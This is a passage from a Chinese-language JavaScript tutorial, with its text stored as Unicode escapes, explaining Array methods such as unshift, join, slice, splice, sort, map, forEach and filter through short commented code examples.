\u65b9\u6cd5\u7528\u4e8e\u5728\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u4f4d\u7f6e\u6dfb\u52a0\u5143\u7d20\uff0c\u5e76\u8fd4\u56de\u6dfb\u52a0\u65b0\u5143\u7d20\u540e\u7684\u6570\u7ec4\u957f\u5ea6\u3002\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4f1a\u6539\u53d8\u539f\u6570\u7ec4\u3002 1 2 3 4 var a = [ 'a' , 'b' , 'c' ]; a . unshift ( 'x' ); // 4 a // ['x', 'a', 'b', 'c'] unshift() \u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u591a\u4e2a\u53c2\u6570\uff0c\u8fd9\u4e9b\u53c2\u6570\u90fd\u4f1a\u6dfb\u52a0\u5230\u76ee\u6807\u6570\u7ec4\u5934\u90e8\u3002 1 2 3 var arr = [ 'c' , 'd' ]; arr . unshift ( 'a' , 'b' ) // 4 arr // [ 'a', 'b', 'c', 'd' ] join() \u00b6 join() \u65b9\u6cd5\u4ee5\u6307\u5b9a\u53c2\u6570\u4f5c\u4e3a\u5206\u9694\u7b26\uff0c\u5c06\u6240\u6709\u6570\u7ec4\u6210\u5458\u8fde\u63a5\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\u8fd4\u56de\u3002\u5982\u679c\u4e0d\u63d0\u4f9b\u53c2\u6570\uff0c\u9ed8\u8ba4\u7528\u9017\u53f7\u5206\u9694\u3002 1 2 3 4 5 var a = [ 1 , 2 , 3 , 4 ]; a . join ( ' ' ) // '1 2 3 4' a . join ( ' | ' ) // \"1 | 2 | 3 | 4\" a . join () // \"1,2,3,4\" \u5982\u679c\u6570\u7ec4\u6210\u5458\u662f undefined \u6216 null \u6216\u7a7a\u4f4d\uff0c\u4f1a\u88ab\u8f6c\u6210\u7a7a\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 [ undefined , null ]. join ( '#' ) // '#' [ 'a' ,, 'b' ]. join ( '-' ) // 'a--b' \u901a\u8fc7 call \u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5b57\u7b26\u4e32\u6216\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u3002 1 2 3 4 5 6 Array . prototype . join . call ( 'hello' , '-' ) // \"h-e-l-l-o\" var obj = { 0 : 'a' , 1 : 'b' , length : 2 }; Array . prototype . join . call ( obj , '-' ) // 'a-b' concat() \u00b6 concat \u65b9\u6cd5\u7528\u4e8e\u591a\u4e2a\u6570\u7ec4\u7684\u5408\u5e76\u3002\u5b83\u5c06\u65b0\u6570\u7ec4\u7684\u6210\u5458\uff0c\u6dfb\u52a0\u5230\u539f\u6570\u7ec4\u6210\u5458\u7684\u540e\u90e8\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u65b0\u6570\u7ec4\uff0c\u539f\u6570\u7ec4\u4e0d\u53d8\u3002 1 2 3 4 5 6 7 8 9 10 11 [ 'hello' ]. concat ([ 'world' ]) // [\"hello\", \"world\"] [ 'hello' ]. concat ([ 'world' ], [ '!' ]) // [\"hello\", \"world\", \"!\"] []. concat ({ a : 1 }, { b : 2 }) // [{ a: 1 }, { b: 2 }] [ 2 ]. concat ({ a : 1 }) // [2, {a: 1}] \u9664\u4e86\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\uff0c concat \u4e5f\u63a5\u53d7\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u6dfb\u52a0\u5230\u76ee\u6807\u6570\u7ec4\u5c3e\u90e8\u3002 1 2 [ 1 , 2 , 3 ]. concat ( 4 , 5 , 6 ) // [1, 2, 3, 4, 5, 6] \u5982\u679c\u6570\u7ec4\u6210\u5458\u5305\u62ec\u5bf9\u8c61\uff0c concat \u65b9\u6cd5\u8fd4\u56de\u5f53\u524d\u6570\u7ec4\u7684\u4e00\u4e2a\u6d45\u62f7\u8d1d\u3002\u6240\u8c13\u201c\u6d45\u62f7\u8d1d\u201d\uff0c\u6307\u7684\u662f\u65b0\u6570\u7ec4\u62f7\u8d1d\u7684\u662f\u5bf9\u8c61\u7684\u5f15\u7528\u3002 1 2 3 4 5 6 7 var obj = { a : 1 }; var oldArray = [ obj ]; var newArray = oldArray . concat (); obj . a = 2 ; newArray [ 0 ]. a // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u539f\u6570\u7ec4\u5305\u542b\u4e00\u4e2a\u5bf9\u8c61\uff0c concat \u65b9\u6cd5\u751f\u6210\u7684\u65b0\u6570\u7ec4\u5305\u542b\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u6240\u4ee5\uff0c\u6539\u53d8\u539f\u5bf9\u8c61\u4ee5\u540e\uff0c\u65b0\u6570\u7ec4\u8ddf\u7740\u6539\u53d8\u3002 reverse() \u00b6 reverse \u65b9\u6cd5\u7528\u4e8e\u98a0\u5012\u6392\u5217\u6570\u7ec4\u5143\u7d20\uff0c\u8fd4\u56de\u6539\u53d8\u540e\u7684\u6570\u7ec4\u3002\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u5c06\u6539\u53d8\u539f\u6570\u7ec4\u3002 1 2 3 4 var a = [ 'a' , 'b' , 'c' ]; a . reverse () // [\"c\", \"b\", \"a\"] a // [\"c\", \"b\", \"a\"] slice() \u00b6 slice() \u65b9\u6cd5\u7528\u4e8e\u63d0\u53d6\u76ee\u6807\u6570\u7ec4\u7684\u4e00\u90e8\u5206\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u6570\u7ec4\uff0c\u539f\u6570\u7ec4\u4e0d\u53d8\u3002 1 arr . slice ( start , end ); \u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u8d77\u59cb\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\uff0c\u4f1a\u5305\u62ec\u5728\u8fd4\u56de\u7684\u65b0\u6570\u7ec4\u4e4b\u4e2d\uff09\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u7ec8\u6b62\u4f4d\u7f6e\uff08\u4f46\u8be5\u4f4d\u7f6e\u7684\u5143\u7d20\u672c\u8eab\u4e0d\u5305\u62ec\u5728\u5185\uff09\u3002\u5982\u679c\u7701\u7565\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5219\u4e00\u76f4\u8fd4\u56de\u5230\u539f\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u6210\u5458\u3002 1 2 3 4 5 6 7 var a = [ 'a' , 'b' , 'c' ]; a . slice ( 0 ) // [\"a\", \"b\", \"c\"] a . slice ( 1 ) // [\"b\", \"c\"] a . slice ( 1 , 2 ) // [\"b\"] a . slice ( 2 , 6 ) // [\"c\"] a . slice () // [\"a\", \"b\", \"c\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6700\u540e\u4e00\u4e2a\u4f8b\u5b50 slice() \u6ca1\u6709\u53c2\u6570\uff0c\u5b9e\u9645\u4e0a\u7b49\u4e8e\u8fd4\u56de\u4e00\u4e2a\u539f\u6570\u7ec4\u7684\u62f7\u8d1d\u3002 \u5982\u679c slice() \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u8d1f\u6570\uff0c\u5219\u8868\u793a\u5012\u6570\u8ba1\u7b97\u7684\u4f4d\u7f6e\u3002 1 2 3 var a = [ 'a' , 'b' , 'c' ]; a . slice ( - 2 ) // [\"b\", \"c\"] a . slice ( - 2 , - 1 ) // [\"b\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c -2 \u8868\u793a\u5012\u6570\u8ba1\u7b97\u7684\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\uff0c -1 \u8868\u793a\u5012\u6570\u8ba1\u7b97\u7684\u7b2c\u4e00\u4e2a\u4f4d\u7f6e\u3002 \u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u5927\u4e8e\u7b49\u4e8e\u6570\u7ec4\u957f\u5ea6\uff0c\u6216\u8005\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5c0f\u4e8e\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u5219\u8fd4\u56de\u7a7a\u6570\u7ec4\u3002 1 2 3 var a = [ 'a' , 'b' , 'c' ]; a . slice ( 4 ) // [] a . slice ( 2 , 1 ) // [] slice() \u65b9\u6cd5\u7684\u4e00\u4e2a\u91cd\u8981\u5e94\u7528\uff0c\u662f\u5c06\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002 1 2 3 4 5 Array . prototype . slice . call ({ 0 : 'a' , 1 : 'b' , length : 2 }) // ['a', 'b'] Array . prototype . slice . call ( document . querySelectorAll ( \"div\" )); Array . prototype . slice . call ( arguments ); \u4e0a\u9762\u4ee3\u7801\u7684\u53c2\u6570\u90fd\u4e0d\u662f\u6570\u7ec4\uff0c\u4f46\u662f\u901a\u8fc7 call \u65b9\u6cd5\uff0c\u5728\u5b83\u4eec\u4e0a\u9762\u8c03\u7528 slice() \u65b9\u6cd5\uff0c\u5c31\u53ef\u4ee5\u628a\u5b83\u4eec\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002 splice() \u00b6 splice() \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u539f\u6570\u7ec4\u7684\u4e00\u90e8\u5206\u6210\u5458\uff0c\u5e76\u53ef\u4ee5\u5728\u5220\u9664\u7684\u4f4d\u7f6e\u6dfb\u52a0\u65b0\u7684\u6570\u7ec4\u6210\u5458\uff0c\u8fd4\u56de\u503c\u662f\u88ab\u5220\u9664\u7684\u5143\u7d20\u3002\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4f1a\u6539\u53d8\u539f\u6570\u7ec4\u3002 1 arr . splice ( start , count , addElement1 , addElement2 , ...); splice \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5220\u9664\u7684\u8d77\u59cb\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\uff09\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u88ab\u5220\u9664\u7684\u5143\u7d20\u4e2a\u6570\u3002\u5982\u679c\u540e\u9762\u8fd8\u6709\u66f4\u591a\u7684\u53c2\u6570\uff0c\u5219\u8868\u793a\u8fd9\u4e9b\u5c31\u662f\u8981\u88ab\u63d2\u5165\u6570\u7ec4\u7684\u65b0\u5143\u7d20\u3002 1 2 3 var a = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' ]; a . splice ( 4 , 2 ) // [\"e\", \"f\"] a // [\"a\", \"b\", \"c\", \"d\"] \u4e0a\u9762\u4ee3\u7801\u4ece\u539f\u6570\u7ec44\u53f7\u4f4d\u7f6e\uff0c\u5220\u9664\u4e86\u4e24\u4e2a\u6570\u7ec4\u6210\u5458\u3002 1 2 3 var a = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' ]; a . splice ( 4 , 2 , 1 , 2 ) // [\"e\", \"f\"] a // [\"a\", \"b\", \"c\", \"d\", 1, 2] \u4e0a\u9762\u4ee3\u7801\u9664\u4e86\u5220\u9664\u6210\u5458\uff0c\u8fd8\u63d2\u5165\u4e86\u4e24\u4e2a\u65b0\u6210\u5458\u3002 \u8d77\u59cb\u4f4d\u7f6e\u5982\u679c\u662f\u8d1f\u6570\uff0c\u5c31\u8868\u793a\u4ece\u5012\u6570\u4f4d\u7f6e\u5f00\u59cb\u5220\u9664\u3002 1 2 var a = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' ]; a . splice ( - 4 , 2 ) // [\"c\", \"d\"] \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u4ece\u5012\u6570\u7b2c\u56db\u4e2a\u4f4d\u7f6e c \u5f00\u59cb\u5220\u9664\u4e24\u4e2a\u6210\u5458\u3002 \u5982\u679c\u53ea\u662f\u5355\u7eaf\u5730\u63d2\u5165\u5143\u7d20\uff0c splice \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u8bbe\u4e3a 0 \u3002 1 2 3 4 var a = [ 1 , 1 , 1 ]; a . splice ( 1 , 0 , 2 ) // [] a // [1, 2, 1, 1] \u5982\u679c\u53ea\u63d0\u4f9b\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u7b49\u540c\u4e8e\u5c06\u539f\u6570\u7ec4\u5728\u6307\u5b9a\u4f4d\u7f6e\u62c6\u5206\u6210\u4e24\u4e2a\u6570\u7ec4\u3002 1 2 3 var a = [ 1 , 2 , 3 , 4 ]; a . splice ( 2 ) // [3, 4] a // [1, 2] sort() \u00b6 sort \u65b9\u6cd5\u5bf9\u6570\u7ec4\u6210\u5458\u8fdb\u884c\u6392\u5e8f\uff0c\u9ed8\u8ba4\u662f\u6309\u7167\u5b57\u5178\u987a\u5e8f\u6392\u5e8f\u3002\u6392\u5e8f\u540e\uff0c\u539f\u6570\u7ec4\u5c06\u88ab\u6539\u53d8\u3002 1 2 3 4 5 6 7 8 9 10 11 [ 'd' , 'c' , 'b' , 'a' ]. sort () // ['a', 'b', 'c', 'd'] [ 4 , 3 , 2 , 1 ]. sort () // [1, 2, 3, 4] [ 11 , 101 ]. sort () // [101, 11] [ 10111 , 1101 , 111 ]. sort () // [10111, 1101, 111] \u4e0a\u9762\u4ee3\u7801\u7684\u6700\u540e\u4e24\u4e2a\u4f8b\u5b50\uff0c\u9700\u8981\u7279\u6b8a\u6ce8\u610f\u3002 sort() \u65b9\u6cd5\u4e0d\u662f\u6309\u7167\u5927\u5c0f\u6392\u5e8f\uff0c\u800c\u662f\u6309\u7167\u5b57\u5178\u987a\u5e8f\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6570\u503c\u4f1a\u88ab\u5148\u8f6c\u6210\u5b57\u7b26\u4e32\uff0c\u518d\u6309\u7167\u5b57\u5178\u987a\u5e8f\u8fdb\u884c\u6bd4\u8f83\uff0c\u6240\u4ee5 101 \u6392\u5728 11 \u7684\u524d\u9762\u3002 \u5982\u679c\u60f3\u8ba9 sort \u65b9\u6cd5\u6309\u7167\u81ea\u5b9a\u4e49\u65b9\u5f0f\u6392\u5e8f\uff0c\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2a\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u3002 1 2 3 4 [ 10111 , 1101 , 111 ]. sort ( function ( a , b ) { return a - b ; }) // [111, 1101, 10111] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c sort \u7684\u53c2\u6570\u51fd\u6570\u672c\u8eab\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u8fdb\u884c\u6bd4\u8f83\u7684\u4e24\u4e2a\u6570\u7ec4\u6210\u5458\u3002\u5982\u679c\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u503c\u5927\u4e8e 0 \uff0c\u8868\u793a\u7b2c\u4e00\u4e2a\u6210\u5458\u6392\u5728\u7b2c\u4e8c\u4e2a\u6210\u5458\u540e\u9762\uff1b\u5176\u4ed6\u60c5\u51b5\u4e0b\uff0c\u90fd\u662f\u7b2c\u4e00\u4e2a\u5143\u7d20\u6392\u5728\u7b2c\u4e8c\u4e2a\u5143\u7d20\u524d\u9762\u3002 1 2 3 4 5 6 7 8 9 10 11 12 [ { name : \"\u5f20\u4e09\" , age : 30 }, { name : \"\u674e\u56db\" , age : 24 }, { name : \"\u738b\u4e94\" , age : 28 } ]. sort ( function ( o1 , o2 ) { return o1 . age - o2 . age ; }) // [ // { name: \"\u674e\u56db\", age: 24 }, // { name: \"\u738b\u4e94\", age: 28 }, // { name: \"\u5f20\u4e09\", age: 30 } // ] \u6ce8\u610f\uff0c\u81ea\u5b9a\u4e49\u7684\u6392\u5e8f\u51fd\u6570\u5e94\u8be5\u8fd4\u56de\u6570\u503c\uff0c\u5426\u5219\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u53ef\u80fd\u6709\u4e0d\u540c\u7684\u5b9e\u73b0\uff0c\u4e0d\u80fd\u4fdd\u8bc1\u7ed3\u679c\u90fd\u4e00\u81f4\u3002 1 2 3 4 5 // bad [ 1 , 4 , 2 , 6 , 0 , 6 , 2 , 6 ]. sort (( a , b ) => a > b ) // good [ 1 , 4 , 2 , 6 , 0 , 6 , 2 , 6 ]. sort (( a , b ) => a - b ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u524d\u4e00\u79cd\u6392\u5e8f\u7b97\u6cd5\u8fd4\u56de\u7684\u662f\u5e03\u5c14\u503c\uff0c\u8fd9\u662f\u4e0d\u63a8\u8350\u4f7f\u7528\u7684\u3002\u540e\u4e00\u79cd\u662f\u6570\u503c\uff0c\u624d\u662f\u66f4\u597d\u7684\u5199\u6cd5\u3002 map() \u00b6 map() \u65b9\u6cd5\u5c06\u6570\u7ec4\u7684\u6240\u6709\u6210\u5458\u4f9d\u6b21\u4f20\u5165\u53c2\u6570\u51fd\u6570\uff0c\u7136\u540e\u628a\u6bcf\u4e00\u6b21\u7684\u6267\u884c\u7ed3\u679c\u7ec4\u6210\u4e00\u4e2a\u65b0\u6570\u7ec4\u8fd4\u56de\u3002 1 2 3 4 5 6 7 8 9 var numbers = [ 1 , 2 , 3 ]; numbers . map ( function ( n ) { return n + 1 ; }); // [2, 3, 4] numbers // [1, 2, 3] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c numbers \u6570\u7ec4\u7684\u6240\u6709\u6210\u5458\u4f9d\u6b21\u6267\u884c\u53c2\u6570\u51fd\u6570\uff0c\u8fd0\u884c\u7ed3\u679c\u7ec4\u6210\u4e00\u4e2a\u65b0\u6570\u7ec4\u8fd4\u56de\uff0c\u539f\u6570\u7ec4\u6ca1\u6709\u53d8\u5316\u3002 map() \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u3002\u8be5\u51fd\u6570\u8c03\u7528\u65f6\uff0c map() \u65b9\u6cd5\u5411\u5b83\u4f20\u5165\u4e09\u4e2a\u53c2\u6570\uff1a\u5f53\u524d\u6210\u5458\u3001\u5f53\u524d\u4f4d\u7f6e\u548c\u6570\u7ec4\u672c\u8eab\u3002 1 2 3 4 [ 1 , 2 , 3 ]. map ( function ( elem , index , arr ) { return elem * index ; }); // [0, 2, 6] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c map() \u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\u6709\u4e09\u4e2a\u53c2\u6570\uff0c elem \u4e3a\u5f53\u524d\u6210\u5458\u7684\u503c\uff0c index \u4e3a\u5f53\u524d\u6210\u5458\u7684\u4f4d\u7f6e\uff0c arr \u4e3a\u539f\u6570\u7ec4\uff08 [1, 2, 3] \uff09\u3002 map() \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7528\u6765\u7ed1\u5b9a\u56de\u8c03\u51fd\u6570\u5185\u90e8\u7684 this \u53d8\u91cf\uff08\u8be6\u89c1\u300athis \u53d8\u91cf\u300b\u4e00\u7ae0\uff09\u3002 1 2 3 4 5 6 var arr = [ 'a' , 'b' , 'c' ]; [ 1 , 2 ]. map ( function ( e ) { return this [ e ]; }, arr ) // ['b', 'c'] \u4e0a\u9762\u4ee3\u7801\u901a\u8fc7 map() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5c06\u56de\u8c03\u51fd\u6570\u5185\u90e8\u7684 this \u5bf9\u8c61\uff0c\u6307\u5411 arr \u6570\u7ec4\u3002 \u5982\u679c\u6570\u7ec4\u6709\u7a7a\u4f4d\uff0c map() \u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\u5728\u8fd9\u4e2a\u4f4d\u7f6e\u4e0d\u4f1a\u6267\u884c\uff0c\u4f1a\u8df3\u8fc7\u6570\u7ec4\u7684\u7a7a\u4f4d\u3002 1 2 3 4 5 var f = function ( n ) { return 'a' }; [ 1 , undefined , 2 ]. map ( f ) // [\"a\", \"a\", \"a\"] [ 1 , null , 2 ]. map ( f ) // [\"a\", \"a\", \"a\"] [ 1 , , 2 ]. map ( f ) // [\"a\", , \"a\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c map() \u65b9\u6cd5\u4e0d\u4f1a\u8df3\u8fc7 undefined \u548c null \uff0c\u4f46\u662f\u4f1a\u8df3\u8fc7\u7a7a\u4f4d\u3002 forEach() \u00b6 forEach() \u65b9\u6cd5\u4e0e map() \u65b9\u6cd5\u5f88\u76f8\u4f3c\uff0c\u4e5f\u662f\u5bf9\u6570\u7ec4\u7684\u6240\u6709\u6210\u5458\u4f9d\u6b21\u6267\u884c\u53c2\u6570\u51fd\u6570\u3002\u4f46\u662f\uff0c forEach() \u65b9\u6cd5\u4e0d\u8fd4\u56de\u503c\uff0c\u53ea\u7528\u6765\u64cd\u4f5c\u6570\u636e\u3002\u8fd9\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6570\u7ec4\u904d\u5386\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u5f97\u5230\u8fd4\u56de\u503c\uff0c\u90a3\u4e48\u4f7f\u7528 map() \u65b9\u6cd5\uff0c\u5426\u5219\u4f7f\u7528 forEach() \u65b9\u6cd5\u3002 forEach() \u7684\u7528\u6cd5\u4e0e map() \u65b9\u6cd5\u4e00\u81f4\uff0c\u53c2\u6570\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u540c\u6837\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff1a\u5f53\u524d\u503c\u3001\u5f53\u524d\u4f4d\u7f6e\u3001\u6574\u4e2a\u6570\u7ec4\u3002 1 2 3 4 5 6 7 8 function log ( element , index , array ) { console . log ( '[' + index + '] = ' + element ); } [ 2 , 5 , 9 ]. forEach ( log ); // [0] = 2 // [1] = 5 // [2] = 9 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c forEach() \u904d\u5386\u6570\u7ec4\u4e0d\u662f\u4e3a\u4e86\u5f97\u5230\u8fd4\u56de\u503c\uff0c\u800c\u662f\u4e3a\u4e86\u5728\u5c4f\u5e55\u8f93\u51fa\u5185\u5bb9\uff0c\u6240\u4ee5\u4e0d\u5fc5\u4f7f\u7528 map() \u65b9\u6cd5\u3002 forEach() \u65b9\u6cd5\u4e5f\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7ed1\u5b9a\u53c2\u6570\u51fd\u6570\u7684 this \u53d8\u91cf\u3002 1 2 3 4 5 6 7 var out = []; [ 1 , 2 , 3 ]. forEach ( function ( elem ) { this . push ( elem * elem ); }, out ); out // [1, 4, 9] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7a7a\u6570\u7ec4 out \u662f forEach() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7ed3\u679c\uff0c\u56de\u8c03\u51fd\u6570\u5185\u90e8\u7684 this \u5173\u952e\u5b57\u5c31\u6307\u5411 out \u3002 \u6ce8\u610f\uff0c forEach() \u65b9\u6cd5\u65e0\u6cd5\u4e2d\u65ad\u6267\u884c\uff0c\u603b\u662f\u4f1a\u5c06\u6240\u6709\u6210\u5458\u904d\u5386\u5b8c\u3002\u5982\u679c\u5e0c\u671b\u7b26\u5408\u67d0\u79cd\u6761\u4ef6\u65f6\uff0c\u5c31\u4e2d\u65ad\u904d\u5386\uff0c\u8981\u4f7f\u7528 for \u5faa\u73af\u3002 1 2 3 4 5 6 7 var arr = [ 1 , 2 , 3 ]; for ( var i = 0 ; i < arr . length ; i ++ ) { if ( arr [ i ] === 2 ) break ; console . log ( arr [ i ]); } // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6267\u884c\u5230\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u6210\u5458\u65f6\uff0c\u5c31\u4f1a\u4e2d\u65ad\u6267\u884c\u3002 forEach() \u65b9\u6cd5\u505a\u4e0d\u5230\u8fd9\u4e00\u70b9\u3002 forEach() \u65b9\u6cd5\u4e5f\u4f1a\u8df3\u8fc7\u6570\u7ec4\u7684\u7a7a\u4f4d\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var log = function ( n ) { console . log ( n + 1 ); }; [ 1 , undefined , 2 ]. forEach ( log ) // 2 // NaN // 3 [ 1 , null , 2 ]. forEach ( log ) // 2 // 1 // 3 [ 1 , , 2 ]. forEach ( log ) // 2 // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c forEach() \u65b9\u6cd5\u4e0d\u4f1a\u8df3\u8fc7 undefined \u548c null \uff0c\u4f46\u4f1a\u8df3\u8fc7\u7a7a\u4f4d\u3002 filter() \u00b6 filter() \u65b9\u6cd5\u7528\u4e8e\u8fc7\u6ee4\u6570\u7ec4\u6210\u5458\uff0c\u6ee1\u8db3\u6761\u4ef6\u7684\u6210\u5458\u7ec4\u6210\u4e00\u4e2a\u65b0\u6570\u7ec4\u8fd4\u56de\u3002 \u5b83\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u6240\u6709\u6570\u7ec4\u6210\u5458\u4f9d\u6b21\u6267\u884c\u8be5\u51fd\u6570\uff0c\u8fd4\u56de\u7ed3\u679c\u4e3a true \u7684\u6210\u5458\u7ec4\u6210\u4e00\u4e2a\u65b0\u6570\u7ec4\u8fd4\u56de\u3002\u8be5\u65b9\u6cd5\u4e0d\u4f1a\u6539\u53d8\u539f\u6570\u7ec4\u3002 1 2 3 4 [ 1 , 2 , 3 , 4 , 5 ]. filter ( function ( elem ) { return ( elem > 3 ); }) // [4, 5] \u4e0a\u9762\u4ee3\u7801\u5c06\u5927\u4e8e 3 \u7684\u6570\u7ec4\u6210\u5458\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u65b0\u6570\u7ec4\u8fd4\u56de\u3002 1 2 3 4 var arr = [ 0 , 1 , 'a' , false ]; arr . filter ( Boolean ) // [1, \"a\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c filter() \u65b9\u6cd5\u8fd4\u56de\u6570\u7ec4 arr \u91cc\u9762\u6240\u6709\u5e03\u5c14\u503c\u4e3a true \u7684\u6210\u5458\u3002 filter() \u65b9\u6cd5\u7684\u53c2\u6570\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff1a\u5f53\u524d\u6210\u5458\uff0c\u5f53\u524d\u4f4d\u7f6e\u548c\u6574\u4e2a\u6570\u7ec4\u3002 1 2 3 4 [ 1 , 2 , 3 , 4 , 5 ]. filter ( function ( elem , index , arr ) { return index % 2 === 0 ; }); // [1, 3, 5] \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de\u5076\u6570\u4f4d\u7f6e\u7684\u6210\u5458\u7ec4\u6210\u7684\u65b0\u6570\u7ec4\u3002 filter() \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7528\u6765\u7ed1\u5b9a\u53c2\u6570\u51fd\u6570\u5185\u90e8\u7684 this \u53d8\u91cf\u3002 1 2 3 4 5 6 7 var obj = { MAX : 3 }; var myFilter = function ( item ) { if ( item > this . MAX ) return true ; }; var arr = [ 2 , 8 , 3 , 4 , 1 , 3 , 2 , 9 ]; arr . filter ( myFilter , obj ) // [8, 4, 9] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8fc7\u6ee4\u5668 myFilter() \u5185\u90e8\u6709 this \u53d8\u91cf\uff0c\u5b83\u53ef\u4ee5\u88ab filter() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570 obj \u7ed1\u5b9a\uff0c\u8fd4\u56de\u5927\u4e8e 3 \u7684\u6210\u5458\u3002 some()\uff0cevery() \u00b6 \u8fd9\u4e24\u4e2a\u65b9\u6cd5\u7c7b\u4f3c\u201c\u65ad\u8a00\u201d\uff08assert\uff09\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5224\u65ad\u6570\u7ec4\u6210\u5458\u662f\u5426\u7b26\u5408\u67d0\u79cd\u6761\u4ef6\u3002 \u5b83\u4eec\u63a5\u53d7\u4e00\u4e2a\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u6240\u6709\u6570\u7ec4\u6210\u5458\u4f9d\u6b21\u6267\u884c\u8be5\u51fd\u6570\u3002\u8be5\u51fd\u6570\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff1a\u5f53\u524d\u6210\u5458\u3001\u5f53\u524d\u4f4d\u7f6e\u548c\u6574\u4e2a\u6570\u7ec4\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\u3002 some \u65b9\u6cd5\u662f\u53ea\u8981\u4e00\u4e2a\u6210\u5458\u7684\u8fd4\u56de\u503c\u662f true \uff0c\u5219\u6574\u4e2a some \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u5c31\u662f true \uff0c\u5426\u5219\u8fd4\u56de false \u3002 1 2 3 4 5 var arr = [ 1 , 2 , 3 , 4 , 5 ]; arr . some ( function ( elem , index , arr ) { return elem >= 3 ; }); // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u6570\u7ec4 arr 